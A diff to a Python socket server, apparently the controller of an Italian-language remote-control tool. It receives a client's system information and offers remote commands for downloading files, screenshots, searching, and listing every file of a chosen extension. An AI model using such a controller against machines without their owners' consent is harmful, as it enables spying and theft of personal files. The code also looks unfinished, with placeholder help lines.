@@ -1,9 +1,10 @@
 from socket import *
-import socket
 import signal
+import time
+import sys
 
 IP = "localhost"
-PORT = 12001
+PORT = 9090
 ADDR = (IP, PORT)
 SIZE = 4096
 FORMAT = "utf-8"
@@ -19,19 +20,20 @@ def serverConnection():
     try:
         server=socket(AF_INET,SOCK_STREAM)
         server.bind(ADDR)
-        server.listen(1)
+        server.listen(5)
         print(f"\n[LISTENING] Server is up and it's waiting for a client connection")
+        return server
     except:
         print(f"[ERROR] Connection refused")
         exit(1)
-    return server
+
 
 
 #lista dei comandi disponibili per il controllo remoto
 def commandsHelp():
     print("#####    Comandi disponibili     ####")
     print()
-    print("Download di file:    download <nomeFile.estensione>")
+    print("Download di file:    download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
     print("Mostra Working Directory:    pwd")
     print("Lista dei file in un percorso:   ls")
     print("Lista di tutti i file (compresi i nascosti) in un percorso:  ls -a")
@@ -40,6 +42,8 @@ def commandsHelp():
     print("Cerca un file nel path desiderato:   find <nomeFile.estensione> <Path>")
     print("Effettua screenshot:     screenshot")
     print("Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <nomeFiletxt> <estensione>")
+    print("aggiungere di poter usare anche gli altri comandi")
+    print("file log")
     print("Esci dal controllo remoto:   exit")
     print()
     print("####################################")
@@ -50,17 +54,18 @@ def printInformazioni(clientConnection):
     #Ricezione del file dal Client
     buff=1
     risposta="y"
-    nbytes=clientConnection.recv(1024).decode(FORMAT)
-    print(nbytes)
+    nbytes=1
 
     while buff and nbytes != '':
-        buff=clientConnection.recv((int(nbytes)+1)).decode(FORMAT)
+        nbytes = clientConnection.recv(1024).decode(FORMAT)
+        buff=clientConnection.recv((int(nbytes))).decode(FORMAT)
         nbytes=''
         if buff[0:7] == "[ERROR]":
             risposta=input(buff)
             clientConnection.send((risposta).encode(FORMAT))
             if risposta == "Y" or risposta == "y":
                 buff = 1
+                nbytes= 1
             elif risposta == "N" or risposta == "n":
                 buff = 0
                 break
@@ -68,11 +73,10 @@ def printInformazioni(clientConnection):
         print(buff)
 
     if risposta == "Y" or risposta == "y":
-        print(f"[RECEIVING] File 'OperatingSystem.txt' received: Find all useful information on the client's operating system.\n")
+        print(f"[RECEIVING]\n")
     elif risposta == "N" or risposta == "n":
-        print(f"[RECEIVING] File 'OperatingSystem.txt' not received.\n")
+        print(f"[NOT RECEIVING]\n")
 
-    return "finito"
 
 
 def main():
@@ -84,13 +88,9 @@ def main():
 
         clientConnection, addr = server.accept()
         print(f"[CONNECTED] Client {addr} is connected to the server")
-        print()
 
         # ricevo info sul sistema
-        OSInfo = clientConnection.recv(1024).decode()
-
-        print(f"System's Information received:\n")
-        print(OSInfo + "\n")
+        printInformazioni(clientConnection)
         time.sleep(4)
         print("[REMOTE CONTROL] Starting procedure...")
         time.sleep(4)
